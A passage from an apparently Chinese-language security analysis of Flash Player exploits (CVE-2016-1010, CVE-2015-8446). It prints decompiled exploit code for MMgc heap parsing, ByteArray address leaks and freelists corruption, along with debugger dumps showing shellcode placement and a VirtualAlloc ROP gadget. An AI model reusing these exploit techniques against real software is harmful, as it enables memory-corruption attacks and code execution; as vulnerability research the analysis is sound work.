        return (jjjj222222lpmc. AddInt (M_allocs01, offset));
      };
      return (jjjj222222lpmc. AddInt (M_allocs02, offset));
    }

图32 LocateFixedAllocAddrBySize(jjj34fdfg)函数

下述代码为exploit中的GetSizeClassIndex实现：

    
    
    public function Jdfgdf435GwgVfg():void
    {
      ...
      kSizeClassIndex64 = [0, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 22, 23, 23, 24, 24, 25, 26, 26, 27, 27, 28,
      28, 28, 29, 29, 30, 30, 30, 30, 31, 31, 31, 32, 32, 32, 32, 32, 33, 33, 33, 33, 33, 33, 34, 34, 34, 34, 34, 34, 34, 35, 35, 35, 35, 35, 35, 35, 35, 35,
      36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38,
      38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39,
      39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40];
      kSizeClassIndex32 = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 17, 18, 18, 19, 19, 20, 21, 22, 23, 24, 24, 25, 26, 26, 27, 27,
      28, 28, 28, 29, 29, 29, 30, 30, 30, 31, 31, 31, 31, 32, 32, 32, 32, 33, 33, 33, 33, 33, 33, 34, 34, 34, 34, 34, 34, 34, 35, 35, 35, 35, 35, 35, 35, 35,
      35, 36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 36, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 38, 38, 38, 38, 38, 38, 38, 38,
      38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39,
      39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40];
      ...
    }
    public function GetSizeClassIndex (arg_size:int) : int
    {
      if(is64bit)
      {
        return kSizeClassIndex64[arg_size + 7 >> 3];
      }
      return kSizeClassIndex32[arg_size + 7 >> 3];
    }

图33 GetSizeClassIndex函数

可以发现这和AVMPlus开源项目中的FixedMalloc::FindAllocatorForSize函数实现是相似的。

    
    
    REALLY_INLINE FixedAllocSafe* FixedMalloc::FindAllocatorForSize(size_t size)
    {
      ...
      // 'index' is (conceptually) "(size8>>3)" but the following
      // optimization allows us to skip the &~7 that is redundant
      // for non-debug builds.
    #ifdef MMGC_64BIT
      unsigned const index = kSizeClassIndex[((size+7)>>3)];
    #else
      // The first bucket is 4 on 32-bit systems, so special case that rather
      // than double the size-class-index table.
      unsigned const index = (size <= 4) ? 0 : kSizeClassIndex[((size+7)>>3)];
    #endif
      ...
      return &m_allocs[index];
    }

图34 FixedMalloc::FindAllocatorForSize函数

    
    
    class FixedMalloc
    {
      ...
      FixedAllocSafe m_allocs[kNumSizeClasses]; // The array of size-segregated allocators for small objects, set in InitInstance
      ...

图35 m_allocs数组变量的声明

下述为AVMplus项目中定义的kSizeClassIndex数组，可以看到它们具有相同的索引值。

    
    
    #ifdef MMGC_64BIT
    /*static*/ const uint8_t FixedMalloc::kSizeClassIndex[kMaxSizeClassIndex] = {
      0, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
      15, 16, 17, 18, 19, 20, 21, 22, 22, 23, 23, 24, 24, 25, 26, 26,
      27, 27, 28, 28, 28, 29, 29, 30, 30, 30, 30, 31, 31, 31, 32, 32,
      32, 32, 32, 33, 33, 33, 33, 33, 33, 34, 34, 34, 34, 34, 34, 34,
      35, 35, 35, 35, 35, 35, 35, 35, 35, 36, 36, 36, 36, 36, 36, 36,
      36, 36, 36, 36, 36, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37,
      37, 37, 37, 37, 37, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38,
      38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 39,
      39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39,
      39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39,
      39, 39, 39, 39, 39, 39, 39, 39, 39, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40
    };
    #else
    /*static*/ const uint8_t FixedMalloc::kSizeClassIndex[kMaxSizeClassIndex] = {
      0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,
      16, 17, 17, 18, 18, 19, 19, 20, 21, 22, 23, 24, 24, 25, 26, 26,
      27, 27, 28, 28, 28, 29, 29, 29, 30, 30, 30, 31, 31, 31, 31, 32,
      32, 32, 32, 33, 33, 33, 33, 33, 33, 34, 34, 34, 34, 34, 34, 34,
      35, 35, 35, 35, 35, 35, 35, 35, 35, 36, 36, 36, 36, 36, 36, 36,
      36, 36, 36, 36, 36, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37, 37,
      37, 37, 37, 37, 37, 37, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38,
      38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38,
      39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39,
      39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 39,
      39, 39, 39, 39, 39, 39, 39, 39, 39, 39, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40,
      40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40
    };
    #endif

图36 AVMplus项目中的kSizeClassIndex定义

#### ParseFixedAllocHeader

FixedAlloc类的定义中包含有指向FixedBlock链表的指针，那些具有相同大小的内存块会被添加到同一链表中。

    
    
    class FixedAlloc
    {
      ...
      private:
       GCHeap *m_heap;           // The heap from which we obtain memory
       uint32_t m_itemsPerBlock; // Number of items that fit in a block
       uint32_t m_itemSize;      // Size of each individual item
       FixedBlock* m_firstBlock; // First block on list of free blocks
       FixedBlock* m_lastBlock;  // Last block on list of free blocks
       FixedBlock* m_firstFree;  // The lowest priority block that has free items
       size_t m_numBlocks;       // Number of blocks owned by this allocator
      ...

图37 FixedAlloc类的定义

而ParseFixedAllocHeader(cvb45)函数将用于解析FixedAlloc对象，它会通过ReadPointer(ghgfhf12341)函数实现的RW
primitive功能来读取内存中相应位置的数据。

    
    
    public function ParseFixedAllocHeader(_arg_1:ByteArray, _arg_2:___Int64):Object
    {
      var _local_3:* = null;
      if (cbvd43) // true when major version >= 20
      {
        return ({
          "m_heap":jjjj222222lpmc.ReadPointer(_arg_1),
          "m_unknown":_arg_1.readUnsignedInt(),
          "m_itemsPerBlock":_arg_1.readUnsignedInt(),
          "m_itemSize":_arg_1.readUnsignedInt(),
          "m_firstBlock":jjjj222222lpmc.ReadPointer(_arg_1),
          "m_lastBlock":jjjj222222lpmc.ReadPointer(_arg_1),
          "m_firstFree":jjjj222222lpmc.ReadPointer(_arg_1),
          "m_maxAlloc":jjjj222222lpmc.ReadPointer(_arg_1),
          "m_isFixedAllocSafe":_arg_1.readByte(),
          "m_spinlock":jjjj222222lpmc.ReadPointer(_arg_1),
          "fixedAllocAddr":_arg_2
          });
      };
      return ({
        "m_heap":jjjj222222lpmc.ReadPointer(_arg_1),
        "m_unknown":0,
        "m_itemsPerBlock":_arg_1.readUnsignedInt(),
        "m_itemSize":_arg_1.readUnsignedInt(),
        "m_firstBlock":jjjj222222lpmc.ReadPointer(_arg_1),
        "m_lastBlock":jjjj222222lpmc.ReadPointer(_arg_1),
        "m_firstFree":jjjj222222lpmc.ReadPointer(_arg_1),
        "m_maxAlloc":jjjj222222lpmc.ReadPointer(_arg_1),
        "m_isFixedAllocSafe":_arg_1.readByte(),
        "m_spinlock":jjjj222222lpmc.ReadPointer(_arg_1),
        "fixedAllocAddr":_arg_2
        });
    }

图38 ParseFixedAllocHeader函数

来看下面的例子，ParseFixedAllocHeaderBySize(ghfgfh23)函数中给定的堆大小为0x7f0，它将返回解析好的堆块结构。

    
    
    Enter: Jdfgdfgd34/instance/ghfgfh23(000007f0, True)
    ...
    Return: Jdfgdfgd34/instance/ghfgfh23 [object Object]
    * Return: Jdfgdfgd34/instance/ghfgfh23 [object Object]
     Location: Jdfgdfgd34/instance/ghfgfh23 block id: 0 line no: 0
     Call Stack:
     Jdfgdfgd34/ghfgfh23()
     Jdfgdfgd34/hhh222()
     J34534534/fdgdfg45345345()
     J34534534/jhfjhhg2432324()
     ...
     Type: Return
     Method: Jdfgdfgd34/instance/ghfgfh23
     Return Value:
     Object:
     m_itemSize: 0x7f0 (2032) // current item size
      fixedAllocAddr:
      high: 0x0 (0)
      low: 0x6fb7c36c (1874314092)
     m_firstFree:
      high: 0x0 (0)
      low: 0x0 (0)
     m_lastBlock:
      high: 0x0 (0)
      low: 0xc0d7000 (202207232)
     m_spinlock:
      high: 0x0 (0)
      low: 0x0 (0)
     m_unknown: 0x1 (1)
     m_isFixedAllocSafe: 0x1 (1)
     m_maxAlloc:
      high: 0x0 (0)
      low: 0x1 (1)
     m_itemsPerBlock: 0x2 (2)
     m_heap:
      high: 0x0 (0)
      low: 0x6fb7a530 (1874306352)
     m_firstBlock:
      high: 0x0 (0)
      low: 0xc0d7000 (202207232)

图39 ParseFixedAllocHeaderBySize(ghfgfh23)函数

返回结果中包含有堆块的首部结构，其中偏移0xc处的DWORD值正好为要查找的大小0x7f0。

    
    
    0:000> dds 6fb7c36c <-- fixedAllocAddr
    6fb7c36c 6fb7a530 <-- m_heap
    6fb7c370 00000001 <-- m_unknown
    6fb7c374 00000002 <-- m_itemsPerBlock
    6fb7c378 000007f0 <-- m_itemSize
    6fb7c37c 0c0d7000 <-- m_firstBlock
    6fb7c380 0c0d7000 <-- m_lastBlock
    6fb7c384 00000000 <-- m_firstFree
    6fb7c388 00000001 <-- m_maxAlloc
    6fb7c38c 00000001 

图40 返回的FixedAlloc结构

#### ParseFixedBlock

在EnumerateFixedBlocks(hhh222)函数中会调用ParseFixedBlock(vcb4)来遍历FixedBlock链表。

    
    
    public function EnumerateFixedBlocks (param1:int, param2:Boolean, param3:Boolean = true, param4:___Int64 = undefined) : Array
    {
      var fixedBlockAddr:* = null as ___Int64;
      var _loc8_:* = null as ___Int64;
      var _loc9_:* = 0;
      var _loc10_:* = null as ByteArray;
      var fixedBlockInfo:* = null;
      var _loc5_:Array = [];
      var _loc6_:* = ParseFixedAllocHeaderBySize(param1,param2);
      if(param3)
      {
        fixedBlockAddr = _loc6_.m_firstBlock;
      }
      else
      {
        fixedBlockAddr = _loc6_.m_lastBlock;
      }
      while(!(jjjj222222lpmc.IsZero(fixedBlockAddr)))
      {
        ...
        _loc10_ = gg2rw.readn(fixedBlockAddr,Jdfgdf435GwgVfg.Hfghgfh3); // read by chunk. _loc10_: ByteArray
        fixedBlockInfo = ParseFixedBlock(_loc10_, fixedBlockAddr); // fixedBlockAddr: size
        _loc5_.push(fixedBlockInfo);
        if(param3)
        {
          fixedBlockAddr = fixedBlockInfo.next;
        }
        else
        {
          fixedBlockAddr = fixedBlockInfo.prev;
        }
      }
      return _loc5_;

图41 借助ParseFixedBlock函数来遍历FixedBlock链表

其中，结构体FixedBlock的定义如下。

    
    
    struct FixedBlock
    {
      void* firstFree;      // First object on the block's free list
      void* nextItem;       // First object free at the end of the block
      FixedBlock* next;     // Next block on the list of blocks (m_firstBlock list in the allocator)
      FixedBlock* prev;     // Previous block on the list of blocks
      uint16_t numAlloc;    // Number of items allocated from the block
      uint16_t size;        // Size of objects in the block
      FixedBlock *nextFree; // Next block on the list of blocks with free items (m_firstFree list in the allocator)
      FixedBlock *prevFree; // Previous block on the list of blocks with free items
      FixedAlloc *alloc;    // The allocator that owns this block
      char items[1];        // Memory for objects starts here
    };

图42 FixedBlock结构的定义

ParseFixedBlock(vcb4)函数将基于上述定义对FixedBlock进行解析。

    
    
    public function ParseFixedBlock (param1:ByteArray, param2:___Int64) : Object
    {
      var _loc3_:* = {
        "firstFree":jjjj222222lpmc.ReadPointer(param1),
        "nextItem":jjjj222222lpmc.ReadPointer(param1),
        "next":jjjj222222lpmc.ReadPointer(param1),
        "prev":jjjj222222lpmc.ReadPointer(param1),
        "numAlloc":param1.readUnsignedShort(),
        "size":param1.readUnsignedShort(),
        "prevFree":jjjj222222lpmc.ReadPointer(param1),
        "nextFree":jjjj222222lpmc.ReadPointer(param1),
        "alloc":jjjj222222lpmc.ReadPointer(param1),
        "blockData":param1,
        "blockAddr":param2
      };
      return _loc3_;
    }

图43 ParseFixedBlock函数

#### 4.2 泄漏ByteArray对象的地址

在CVE-2016-1010的利用样本中还用到了ByteArray对象的地址泄露技术。

#### GetByteArrayAddress

GetByteArrayAddress(hgfh342)函数会将获取到的第一个参数作为期望对象的大小，并枚举MMgc内存空间中具有此大小的对象，最终会返回所有找到的内存块相应的解析结果。

这里GetByteArrayAddress(hgfh342)函数返回的是pairs类型（[ByteArray::Buffer,ByteArray::Buffer.array]）的数组，其中，exploit可以在ByteArray::Buffer.array地址上放置想要的数据。
此外，GetByteArrayAddress(hgfh342)函数需要调用EnumerateFixedBlocks(hhh222)来定位ByteArray对象的堆地址，所给的期望对象大小为40或24，这取决于具体运行的Flash版本。

    
    
    public function J34534534(_arg_1:*, _arg_2:Object, _arg_3:Jdfgdfgd34):void
    {
      ...
      hgfh4343 = 24;
      if ((((nnfgfg3.nfgh23[0] >= 20)) || ((((nnfgfg3.nfgh23[0] == 18)) && ((nnfgfg3.nfgh23[3] >= 324)))))) // Flash version check
      {
        ...
        hgfh4343 = 40;
      };
      ...
    }
    public function GetByteArrayAddress (param1:ByteArray, param2:Boolean = false, param3:int = 0) : Array
    {
      ...
      var _loc9_:Array = jhghjhj234544. EnumerateFixedBlocks (hgfh4343,true); // hgfh4343 is 40 or 24 depending on the Flash version – this is supposed to be the ByteArray object size
    }

图44 在GetByteArrayAddress函数中进行EnumerateFixedBlocks调用

正如上面所说，GetByteArrayAddress(hgfh342)函数通过EnumerateFixedBlocks(hhh222)调用来获取具有特定大小的堆块，即ByteArray对象，之后会在这些对象中查找特殊的标记值。

    
    
    public function GetByteArrayAddress(_arg_1:ByteArray, _arg_2:Boolean=false, marker:int=0):Array
    {
      ...
      var fixedBlockArr:Array = jhghjhj234544. EnumerateFixedBlocks(hgfh4343, true);
      var _local_10:int;
      var fixedBlockArrLength:int = fixedBlockArr.length;
      while (_local_10 < fixedBlockArrLength)
      {
        i = _local_10++;
        _local_13 = ((Jdfgdf435GwgVfg.Hfghgfh3 - gfhgfhg44444.cvhcvb345) / hgfh4343);
        _local_14 = gfhgfhg44444.cvhcvb345;
        _local_15 = fixedBlockArr[i].blockData;
        while (_local_13 > 0)
        {
          _local_15.position = _local_14;
          if (bgfh4)
          {
            _local_15.position = (_local_14 + bbfgh4);
            _local_16 = _local_15.readUnsignedInt();
            _local_15.position = (_local_14 + bgfhgfh34);
            _local_17 = _local_15.readUnsignedInt();
            if ((_local_16 == _local_5))
            {
              _local_15.position = (_local_14 + bbgfgfh4);
              _local_7 = gggexss.AddInt64(fixedBlockArr[i].blockAddr, _local_14);
              _local_6 = jhghjhj234544.jjjj222222lpmc.ReadPointerSizeData(_local_15, false);
              if (((marker!= (0)) && (((!((_local_6.high == _local_8.high))) || (!((_local_6.low == _local_8.low)))))))
              {
                if (hhiwr.read4(_local_6) == marker) // Compare marker
                {
                  return ([_local_7, _local_6]);
                };
              }
              else
              {
                _local_18 = new ___Int64(0, 0);
                _local_8 = _local_18;
                if (((!((_local_6.high == _local_8.high))) || (!((_local_6.low == _local_8.low)))))
                {
                  return ([_local_7, _local_6]);
                };
              };
            };
          }
          ...
          _local_14 = (_local_14 + hgfh4343);
          _local_13--;
        };

图45 在GetByteArrayAddress(hgfh342)函数中对标记值进行启发式搜索

    
    
    public function AllocateByteArrays():Boolean
    {
      ...
      var randomInt:int = Math.ceil(((Math.random() * 0xFFFFFF) + 1));
      ...
      g4 = GetByteArrayAddress(freelists_bytearray, false, randomInt)[1]; // MMgc structure address
      hg45 = GetByteArrayAddress(shellcode_bytearray, false, randomInt)[1]; // Shellcode BytreArray
      ...
    }

图46 randomInt是一个随机生成的标记值

#### 4.3 获取GCBlock的结构

此外，在发现的CVE-2015-8446利用样本中则借助内存的可预测性来访问Flash
Player的内部结构。此例中，在完成堆喷操作后，GCBlock对象会被分配到地址0x1a000000上，而地址0x1a000008中的内容正是exploit要寻找的GC对象基址。

    
    
    ReadInt 1a000004 000007b0 <-- GCBlock.size
    ReadInt 1a000008 0c3ff000 <-- GCBlock.gc

图47 堆喷后读取固定地址处的数据

下述为GCBlockHeader结构体的定义。

    
    
    /**
    * Common block header for GCAlloc and GCLargeAlloc.
    */
    struct GCBlockHeader
    {
      uint8_t bibopTag;         // *MUST* be the first byte. 0 means "not a bibop block." For others, see core/atom.h.
      uint8_t bitsShift;        // Right shift for lower 12 bits of a pointer into the block to obtain the mark bit item for that pointer
      // bitsShift is only used if MMGC_FASTBITS is defined but its always present to simplify header layout.
      uint8_t containsPointers; // nonzero if the block contains pointer-containing objects
      uint8_t rcobject;         // nonzero if the block contains RCObject instances
      uint32_t size;            // Size of objects stored in this block
      GC* gc;                   // The GC that owns this block
      GCAllocBase* alloc;       // the allocator that owns this block
      GCBlockHeader* next;      // The next block in the list of blocks for the allocator
      gcbits_t* bits;           // Variable length table of mark bit entries
    };

图48 GCBlockHeader结构体

其中，0x1a000008处的值是在获取GC结构体指针后通过GCAlloc::CreateChunk方法写入的，此GC结构随后会用于实现JIT内部数据的corruption，而作为迈出代码执行的第一步，ROP链在最开始会选择调用VirtualAlloc函数。

    
    
    447d8020 00000000
    Evaluate expression: 1854116879 = 6e83940f
      0:035> u 6e83940f
      6e83940f ff152874ca6e call dword ptr [Flash!_imp__VirtualAlloc (6eca7428)]
      6e839415 5d pop ebp
      6e839416 c3 ret

图49 exploit中用到的ROP Gadget

### 5 JIT运行时攻击

另一方面，由于CFG保护的存在，攻击者们也逐渐移步到Flash的JIT(just-in-time)运行时，相关[攻击理念](https://www.blackhat.com/docs/eu-15/materials/eu-15-Falcon-Exploiting-Adobe-Flash-Player-In-The-Era-Of-Control-Flow-Guard.pdf)早前已由Francisco
Falcon提出过了，而以JIT方式执行CFG代码则可缓解此类利用。在实际获取的CVE-2016-1010和[CVE-2015-8446](http://blogs.360.cn/360safe/2015/12/19/angler-ek%E6%9C%80%E6%96%B0cve-2015-8446-flash-exploit%E5%88%86%E6%9E%90/)利用样本中我们还观察到了更巧妙的攻击手法，其中一个方法通过已知的CFG保护缺陷来破坏栈上的返回地址，相关细节我们将在未来进行讨论。在这里，我们分享一些关于freelists结构滥用以及MethodInfo._implGPR函数指针corruption的具体细节。

#### 5.1 操控Freelists结构

在CVE-2016-1010的利用样本中，shellcode所保存的位置非常有意思，其中就涉及到了如何操控freelists结构。下面开始分析，可以看到，StartExploit(hgfghfgj2)函数首先调用了AllocateByteArrays(jhgjhj22222)方法，而后会通过名为shellcode_bytearray的ByteArray对象将shellcode写入堆空间。

    
    
    public function StartExploit(_arg_1:ByteArray, _arg_2:int):Boolean
    {
      var _local_4:int;
      var _local_11:int;
      if (!(AllocateByteArrays ()))
      {
        return (false);
      };
      ...
      _local_8 = _local_12;
      shellcode_bytearray.position = (_local_8.low + 0x1800); // a little bit inside the heap region, to be safe not to be cleared up
      shellcode_bytearray.writeBytes(_arg_1); // Writing shellcode to target ByteArray.

图50 分配ByteArray对象并写入shellcode

此exploit通过GetByteArrayAddress(hgfh342)方法获取用于存放freelists元素的内存地址，下述给出的结果中该地址为0x16893000。

    
    
    - Call Return: int.hgfh342 Array
     Location: J34534534/instance/jhgjhj22222 block id: 0 line no: 64
     Method Name: hgfh342
     Return Object ID: 0x210 (528)
     Object Type: int
     Return Value:
      Object:
       high: 0x0 (0)
       low: 0xc122db8 (202517944)
       high: 0x0 (0)
       low: 0x16893000 (378089472) <- memory for fake freelists structure
      Object Type: Array
      Log Level: 0x3 (3)
      Name:
     Object Name:
     Object ID: 0x1d1 (465)

图51 调用GetByteArrayAddress(hgfh342)获取ByteArray对象的内存地址

这里注意一点，和正常情况相同，AllocateByteArrays(jhgjhj22222)方法分配的ByteArray对象所在内存的页面属性也为可读写，相应的两块堆空间将分别用于保存用到的freelists元素以及shellcode代码，为了方便，将这两个ByteArray对象命名为shellcode_bytearray和freelists_bytearray。

    
    
    public function AllocateByteArrays():Boolean
    {
      ...
      var randomInt:int = Math.ceil(((Math.random() * 0xFFFFFF) + 1));
      // Create shellcode ByteArray
      shellcode_bytearray = new ByteArray();
      shellcode_bytearray.endian = Endian.LITTLE_ENDIAN;
      shellcode_bytearray.writeUnsignedInt(_local_1);
      shellcode_bytearray.length = 0x20313;
    
      // Create freelists ByteArray
      freelists_bytearray = new ByteArray();
      freelists_bytearray.endian = Endian.LITTLE_ENDIAN;
      freelists_bytearray.writeUnsignedInt(_local_1);
      freelists_bytearray.length = 0x1322;
    
      g4 = GetByteArrayAddress(freelists_bytearray, false, randomInt)[1]; // Freelists ByteArray
      hg45 = GetByteArrayAddress(shellcode_bytearray, false, randomInt)[1]; // Shellcode ByteArray
      _local_2 = hg45;
      _local_4 = new ___Int64(0, 0);
      _local_3 = _local_4;
      return (((((!((_local_2.high == _local_3.high))) || (!((_local_2.low == _local_3.low))))) && (((!((_local_2.high == _local_3.high))) ||
        (!((_local_2.low == _local_3.low)))))));
    }

图52 分配ByteArray对象并获取相应的内存地址

在GCHeap类中有一个声明为freelists的变量，它是HeapBlock类型的数组，此数组包含那些已经释放掉的或保留的内存块来供程序后面的分配调度。

    
    
    class GCHeap
    {
      ...
      Region *freeRegion;
      Region *nextRegion;
      HeapBlock *blocks;
      size_t blocksLen;
      size_t numDecommitted;
      size_t numRegionBlocks;
      HeapBlock freelists[kNumFreeLists];
      size_t numAlloc;

图53 GCHeap类的定义

exploit会将0x16893000处伪造的freelists元素链接到该数组中。

    
    
    Enter: A1/instance/read4(00000000`6fb7bbb4)
    Return: A1/instance/read4 6fb7bba4
    Enter: A1/instance/write4(00000000`6fb7bbb0, 16893000)
    Return: A1/instance/write4 null
    Enter: A1/instance/write4(00000000`6fb7bbb4, 16893000)
    Return: A1/instance/write4 null

图54 将伪造的freelists元素链接到freelists数组中

此操作将通过修改HeapBlock结构体中的前驱及后继指针来实现。

    
    
    // Block struct used for free lists and memory traversal
    class HeapBlock
    {
     public:
      char *baseAddr; // base address of block's memory
      size_t size; // size of this block
      size_t sizePrevious; // size of previous block
      HeapBlock *prev; // prev entry on free list <- Corruption target
      HeapBlock *next; // next entry on free list <- Corruption target
      bool committed; // is block fully committed?
      bool dirty; // needs zero'ing, only valid if committed

图55 HeapBlock结构体的定义

0x6fb7bba4指向的内容为freelists中的元素，它是HeapBlock类型的结构体，可以通过dump内存来查看exploit是如何对其进行corrupt的。

    
    
    0:000> dds 6fb7bba4 <- HeapBlock structure
    6fb7bba4 00000000
    6fb7bba8 00000000
    6fb7bbac 00000000
    6fb7bbb0 6fb7bba4 HeapBlock.prev <- Corrupted to 16893000
    6fb7bbb4 6fb7bba4 HeapBlock.next <- Corrupted to 16893000
    6fb7bbb8 00000101
    6fb7bbbc 00000000
    6fb7bbc0 00000000
    6fb7bbc4 00000000

图56 freelists数组原先在0x6fb7bbb0处的内容

另外，shellcode代码会被写入0x16dc3000处相应的ByteArray对象中，此地址同样可以通过GetByteArrayAddress(hgfh342)函数来获取。

    
    
    -Call Return: int.hgfh342 Array
     Location: J34534534/instance/jhgjhj22222 block id: 0 line no: 76
     Method Name: hgfh342
     Return Object ID: 0x248 (584)
     Object Type: int
     Return Value:
      Object:
       high: 0x0 (0)
       low: 0xc122d40 (202517824)
       high: 0x0 (0)
       low: 0x16dc3000 (383528960) <- base address of shellocode ByteArray
      Object Type: Array
      Log Level: 0x3 (3)
      Name:
     Object Name:
     Object ID: 0x1d1 (465)

图57 获取保存shellcode的ByteArray对象地址

exploit将在0x16893000处写入该shellcode对应的内存地址值。

    
    
    0:000> dds 16893000
    16893000 16dc3000 <- pointer to shellcode memory
    16893004 00000010
    16893008 00000000
    1689300c 00000000
    16893010 00000000
    16893014 00000001
    16893018 41414141
    1689301c 41414141
    16893020 41414141
    16893024 41414141

图58 0x16893000处放置的是伪造的freelists元素

    
    
    0:000> dds 16dc3000 <- shellcode ByteArray buffer, JIT operation target
    16dc3000 00000000
    16dc3004 00000000
    16dc3008 16dd2fec
    16dc300c 00000001
    16dc3010 16dd2e6c
    16dc3014 00000000
    16dc3018 00000000
    16dc301c 00000000

图59 0x16dc3000处放置的是shellcode

接着前面提到的0x6fb7bbb0处的HeapBlock.prev和0x6fb7bbb4处的HeapBlock.next这两个值会被重写为0x16893000，即伪造的freelists元素所在地址，而该元素的基址又指向了0x16dc3000处的shellcode。

    
    
    Enter: A1/instance/read4(00000000`6fb7bbb4)
    Return: A1/instance/read4 6fb7bba4
    Enter: A1/instance/write4(00000000`6fb7bbb0, 16893000) 
    Return: A1/instance/write4 null
    Enter: A1/instance/write4(00000000`6fb7bbb4, 16893000)
    Return: A1/instance/write4 null

图60 重写HeapBlock.prev和HeapBlock.next的值

小结下，0x16893000地址处放置的是伪造的HeapBlock结构，而0x16dc3000地址处将会保存写入的shellcode代码。这两个堆块的页属性都为可读写，下面给出的是shellcode所在内存的页面信息。

    
    
    0:007> !address 16dc3000
    Usage: <unknown>
    Base Address: 16cf9000
    End Address: 17176000
    Region Size: 00200000 ( 2.000 MB)
    State: 00001000 MEM_COMMIT
    Protect: 00000004 PAGE_READWRITE <- Protection mode is RW
    Type: 00020000 MEM_PRIVATE
    Allocation Base: 16cf9000
    Allocation Protect: 00000001 PAGE_NOACCESS
    Content source: 1 (target), length: 1000

图61 地址0x16dc3000处的页面属性

从下述调试过程可以看出exploit把shellcode地址赋值给了伪造的HeapBlock结构中的基址变量。

    
    
    Breakpoint 1 hit
    eax=16dc3000 ebx=0d5f20d0 ecx=16893000 edx=0b551288 esi=150947c0 edi=0d552020
    eip=6d462537 esp=0b551244 ebp=0b551244 iopl=0 nv up ei pl zr na pe nc
    cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200246
    ...
    6d462535 8901 mov dword ptr [ecx],eax <- ecx: freelists address, eax: shellcode address

图62 freelists[0]将会指向shellcode所在的内存

而这个伪造的freelists元素所指向的内存区域，即shellcode所在的内存，会在GCHeap::AllocBlock调用中被重新声明并作为JIT空间赋予可读可执行的权限。

    
    
    0:026> g
    Breakpoint 1 hit
    eax=16dc3000 ebx=16893000 ecx=00000000 edx=00000000 esi=00000010 edi=00000001
    eip=6d591cc2 esp=0b550ed8 ebp=0b550efc iopl=0 nv up ei ng nz ac pe cy
    cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200297
    Flash!MMgc::alignmentSlop+0x2 [inlined in Flash!MMgc::GCHeap::Partition::AllocBlock+0x72]:
    6d591cc2 8bd7 mov edx,edi
    ...
    0:026> u eip -6
    ...
    6d591cc0 8b03 mov eax,dword ptr [ebx] <- retrieving heap block from free list
    0:026> r ebx
    ebx=16893000
    
    6d591cc2 8bd7 mov edx,edi
    6d591cc4 c1e80c shr eax,0Ch
    6d591cc7 23c1 and eax,ecx
    6d591cc9 2bd0 sub edx,eax
    6d591ccb 23d1 and edx,ecx

图63 获取freelists[0]的基址

相关的代码如下。

    
    
